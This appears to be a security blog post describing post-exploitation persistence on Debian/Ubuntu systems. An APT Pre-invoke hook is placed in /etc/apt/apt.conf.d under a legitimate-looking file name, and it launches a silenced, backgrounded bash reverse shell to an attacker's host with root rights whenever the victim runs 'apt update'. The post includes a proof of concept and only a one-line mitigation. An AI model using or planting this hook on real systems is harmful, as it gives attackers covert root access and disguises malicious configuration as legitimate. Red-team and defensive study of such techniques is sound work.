+++
author = "kiwiyumi"
date = "2024-02-28"
description = "Persistence with APT"
title = "Persistence with APT"
tags = [
    "post-exploitation",
    "persistence"
]
+++

<!--more-->

In today's article we'll talk about how to create a persistence from the APT package manager.  

# What is APT?
Advanced Package Tool (APT) is a command-line tool found in Debian/Ubuntu-based distributions, responsible for updating, installing, removing and managing packages.

# How does it work? 
Understanding the purpose of APT, there are several commands that a user can use, one of which is the **update** function, with the purpose of downloading updates and package information from all configured sources (repositories). Below is the command to run update:

```Bash
sudo apt update
```

In case you didn't notice in the previous command, APT is always used with **Root** permission, guaranteeing a shell with administrative permission.

# Configuring Persistence

When you gain access to the victim's machine, you must already have administrative permission, because only root users have permission to configure the APT directory, located at:

```bash
/etc/apt/apt.conf.d
```

In this directory, create a file that looks legitimate, for example:

```bash
touch 28update-dist
```

With the file created, use a text editor you like and enter the following malicious command:

```bash
APT::Update::Pre-invoke {"/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1' 2> /dev/null &"};
```

A brief explanation of the previous command, the first part is responsible for telling APT to invoke an action at update time, our reverse shell in this case. Next we have a classic reverse shell, then we redirect error messages to **/dev/null** and then we leave all this running in the background.

The following images show the file created on the victim's server and its contents:

![](/assets/images/persistence-with-apt/efd908a1-5b7b-46fe-baa0-c89287666033.png)

![](/assets/images/persistence-with-apt/f9450365-4571-4c3f-b954-8c5b8582e223.png)

# Proof of Concept

To carry out the proof of concept, two machines were used, a Kali Linux (Attacker) and an Ubuntu Server (Victim).

At first, the attacker must leave a port open waiting for the connection to be received. While on the victim's side, it is necessary to wait for them to update their packages with **update**, the moment they do so we can see that we have received a connection with an administrative shell. The following image illustrates this:

![](/assets/images/persistence-with-apt/08b85f18-330b-4b7e-97c4-634533664ff2.png)

# How to fix
If you have found a suspicious package, the mitigation is simple! Just delete the package responsible for doing so.

# Conclusion
In this article we can understand how an attacker can exploit APT to achieve persistence on Debian/Ubuntu systems, a technique that depends on the interaction of the legitimate user.

# References

- [https://ubuntu.com/server/docs/package-management](https://ubuntu.com/server/docs/package-management)